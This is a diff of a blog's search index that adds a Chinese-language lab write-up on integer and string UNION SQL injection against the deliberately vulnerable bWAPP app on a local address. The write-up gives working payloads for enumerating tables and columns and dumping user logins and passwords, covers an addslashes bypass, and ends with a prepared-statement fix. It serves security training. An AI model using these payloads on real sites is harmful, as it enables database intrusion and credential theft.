@@ -1,9 +1,93 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>bWAPP -- SQL Injection</title>
-    <url>/2020/09/19/bWAPP%20--%20SQL%20Injection/</url>
-    <content><![CDATA[<h1 id="bWAPP-–-SQL-Injection-Union-注入"><a href="#bWAPP-–-SQL-Injection-Union-注入" class="headerlink" title="bWAPP – SQL Injection (Union 注入)"></a>bWAPP – SQL Injection (Union 注入)</h1><h2 id="注入基本流程"><a href="#注入基本流程" class="headerlink" title="注入基本流程"></a>注入基本流程</h2><ol>
+    <title>bWAPP-SQLInjection2</title>
+    <url>/2020/09/19/bWAPP-SQLInjection2/</url>
+    <content><![CDATA[<h1 id="整型注入"><a href="#整型注入" class="headerlink" title="整型注入"></a>整型注入</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="寻找注入点，判断是否存在注入"><a href="#寻找注入点，判断是否存在注入" class="headerlink" title="寻找注入点，判断是否存在注入"></a>寻找注入点，判断是否存在注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and 1=1 <span class="comment">#</span></span><br><span class="line"><span class="comment">#正常回显</span></span><br><span class="line">1 and 1=2 <span class="comment">#</span></span><br><span class="line"><span class="comment">#错误回显</span></span><br><span class="line"><span class="comment">#则存在注入</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=100+or+1=1<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/1.png" alt="1"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">192.168.80.2/sqli_2.php?movie=1+and+1=1<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/2.png" alt="2"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">192.168.80.2/sqli_2.php?movie=1+and+1=2<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/3.png" alt="3"></p>
+<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 order by 7 <span class="comment">#</span></span><br><span class="line"><span class="comment">--正常回显</span></span><br><span class="line">1 order by 8 <span class="comment">#</span></span><br><span class="line"><span class="comment">--錯誤回显</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">192.168.80.2/sqli_2.php?movie=1+order+by+7#&amp;action=go</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/5.png" alt="5"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">192.168.80.2/sqli_2.php?movie=1+order+by+8#&amp;action=go</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/4.png" alt="4"></p>
+<h3 id="判断可注入字段位置"><a href="#判断可注入字段位置" class="headerlink" title="判断可注入字段位置"></a>判断可注入字段位置</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="comment">#</span></span><br><span class="line"><span class="comment">-- union 当前面对为false时执行union后面的语句,故选用0，不存在的字符</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+select+1,2,3,4,5,6,7#&amp;action=go</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/6.png" alt="6"></p>
+<h3 id="使用内置函数查看数据库信息"><a href="#使用内置函数查看数据库信息" class="headerlink" title="使用内置函数查看数据库信息"></a>使用内置函数查看数据库信息</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">database();\version();\user()..</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+select+1,database(),version(),user(),5,6,7#&amp;action=go</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/2020/09/19/bWAPP-SQLInjection2/7.png" alt="7"></p>
+<h3 id="查看表名"><a href="#查看表名" class="headerlink" title="查看表名"></a>查看表名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 <code>group_concat()</code>函数把获取的表拼接成字符串，方便查看。</strong></p>
+<p><strong>使用 <code>where table_schema=database()</code>指定当前数据库的表，避免获取全部表，导致获取的表数量过多，无法显示完整</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/8.png" alt="8"></p>
+<h3 id="获取表字段名"><a href="#获取表字段名" class="headerlink" title="获取表字段名"></a>获取表字段名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+information_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">"users"</span>+<span class="keyword">and</span>+table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span>+<span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+information_schema.columns+<span class="keyword">where</span>+table_name=<span class="string">"users"</span>+<span class="keyword">and</span>+table_schema=<span class="keyword">database</span>()<span class="comment">#&amp;action=go</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/9.png" alt="9"></p>
+<h3 id="提权相关信息"><a href="#提权相关信息" class="headerlink" title="提权相关信息"></a>提权相关信息</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span>+<span class="number">1</span>,login,<span class="keyword">password</span>,secret,email,<span class="number">6</span>,<span class="number">7</span>+<span class="keyword">from</span>+<span class="keyword">users</span><span class="comment">#&amp;action=go</span></span><br><span class="line"><span class="comment">--只能显示一行</span></span><br><span class="line"><span class="comment">--可通过 limit 进行逐个提取</span></span><br><span class="line"><span class="comment">--http://192.168.80.2/sqli_2.php?movie=0+union+select+1,login,password,secret,email,6,7+from+users limit 1,1#&amp;action=go</span></span><br></pre></td></tr></table></figure>
+
+<p>limit 可接收一个或两个整型参数</p>
+<ol>
+<li><p>接收一个参数</p>
+<p><code>SELECT * FROM table LIMIT 5;   //检索前5个记录行 换句话说，LIMIT n 等价于 LIMIT 0,n。</code></p>
+</li>
+<li><p>接收两个参数（第一位表示从第几行开始偏移，第二位表示偏移最大数目）</p>
+<p> <code>SELECT * FROM table LIMIT 5,10; // 检索记录行 6-15</code></p>
+</li>
+</ol>
+<p><a href="http://www.phpweblog.net/peiyinjin/archive/2008/04/15/3199.html" target="_blank" rel="noopener">limit的用法</a></p>
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/10.png" alt="10"></p>
+<p>也可通过group_concat进行拼接输出</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/19/bWAPP-SQLInjection2/11.png" alt="11"></p>
+<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><p>使用<code>addslashes();</code>函数进行过滤。受影响字符单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）。</p>
+<p><strong>但是整型注入不受影响（不存在  ‘ 闭合的问题，故不受影响）</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.80.2/sqli_2.php?movie=0+union+<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>使用预处理防止sql注入</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   $id = $_GET[<span class="string">"movie"</span>];</span><br><span class="line"></span><br><span class="line">   $sql = <span class="string">"SELECT title, release_year, genre, main_character, imdb FROM movies WHERE id =?"</span>;  </span><br><span class="line"><span class="comment">// ? 为占位符，等待接收的参数传入</span></span><br><span class="line">   <span class="keyword">if</span>($stmt = $link-&gt;prepare($sql)) </span><br><span class="line">   <span class="comment">// if($stmt = mysqli_prepare($link, $sql))                </span></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Binds the parameters for markers</span></span><br><span class="line">       $stmt-&gt;bind_param(<span class="string">"s"</span>, $id);</span><br><span class="line">       <span class="comment">// mysqli_stmt_bind_param($stmt, "s", $id);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// Executes the query</span></span><br><span class="line">       $stmt-&gt;execute();</span><br><span class="line">       <span class="comment">// mysqli_stmt_execute($stmt);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// Binds the result variables</span></span><br><span class="line">       $stmt-&gt;bind_result($title, $release_year, $genre, $main_character, $imdb);</span><br><span class="line">       <span class="comment">// mysqli_stmt_bind_result($stmt, $title, $release_year, $genre, $main_character, $imdb);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// Stores the result, necessary to count the number of rows</span></span><br><span class="line">       $stmt-&gt;store_result();      </span><br><span class="line">       <span class="comment">// mysqli_stmt_store_result($stmt);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// Prints the number of rows</span></span><br><span class="line">       <span class="comment">// printf("Number of rows: %d.\n", mysqli_stmt_num_rows($stmt));</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.php.net/manual/zh/mysqli.prepare.php" target="_blank" rel="noopener">mysqli_prepare</a></p>
+<p><a href="https://blog.csdn.net/tang_2214/article/details/80349557" target="_blank" rel="noopener">预编译防止sql注入</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>bWAPP--SQL Injection</title>
+    <url>/2020/09/19/bWAPP--SQL%20Injection/</url>
+    <content><![CDATA[<h1 id="bWAPP-–-SQL-Injection-字符型Union-注入"><a href="#bWAPP-–-SQL-Injection-字符型Union-注入" class="headerlink" title="bWAPP – SQL Injection (字符型Union 注入)"></a>bWAPP – SQL Injection (字符型Union 注入)</h1><h2 id="注入基本流程"><a href="#注入基本流程" class="headerlink" title="注入基本流程"></a>注入基本流程</h2><ol>
 <li><p>判断存在注入</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
 
@@ -29,14 +113,14 @@
 <p><a href="https://dev.mysql.com/doc/refman/5.6/en/sql-function-reference.html" target="_blank" rel="noopener">mysql内置函数</a></p>
 </li>
 <li><p>查看表名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),user(),table_name,6,7 from information_schema.tables#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),user(),table_name,6,7 from information_schema.tables table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20200919212051755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 </li>
 </ol>
 <ol start="6">
 <li><p>获取表字段名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),table_name,column_name,6,7 from information_schema.columns where table_name&#x3D;&quot;users&quot;#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,database(),version(),table_name,column_name,6,7 from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20200919212110232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 </li>
@@ -45,7 +129,7 @@
 <p><img src="https://img-blog.csdnimg.cn/20200919212130995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 </li>
 </ol>
-<ul>
+<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><ul>
 <li><p>low</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,login,Password,email,secret,6,7 from users#</span><br></pre></td></tr></table></figure>
 
